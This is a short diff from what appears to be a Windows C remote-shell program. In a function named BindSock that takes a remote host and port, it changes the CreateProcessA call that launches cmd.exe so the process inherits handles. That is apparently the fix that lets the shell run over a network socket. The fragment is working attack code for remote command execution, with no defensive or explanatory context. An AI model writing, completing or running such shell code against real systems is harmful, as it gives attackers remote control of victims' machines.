@@ -68,7 +68,7 @@ void BindSock(char* rhost, int rport) {
 
         printf("[*] Created process props\n");
 
-        CreateProcessA(NULL, "\"cmd.exe\"", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+        CreateProcessA(NULL, "\"cmd.exe\"", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
         WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
